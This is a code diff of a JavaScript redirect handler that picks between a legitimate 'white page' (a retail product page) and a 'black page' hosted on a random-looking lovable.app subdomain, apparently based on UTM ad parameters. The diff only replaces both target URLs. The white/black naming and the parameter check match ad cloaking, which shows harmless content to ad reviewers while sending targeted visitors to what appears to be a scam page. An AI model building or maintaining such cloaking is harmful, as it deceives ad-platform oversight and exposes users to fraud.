@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.audioadvice.com/products/revelation-luxury-home-theater-seating-audio-advice?gad_source=1&gad_campaignid=20477190887&gbraid=0AAAAADRzHk99Ip29auKSs4IX9c76ypPZ2&gclid=Cj0KCQjwvJHIBhCgARIsAEQnWlD2xiDjLYE1XGOCL64Rxhzhzg5F44iA4OPlzLhOl9lD4HnslG__8BMaAs4oEALw_wcB";
-    const blackPageURL = "https://instentquzzz.lovable.app/?";
+    const whitePageURL = "https://kdspain.com/iphone-cases/daisies";
+    const blackPageURL = "https://msgurupml.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
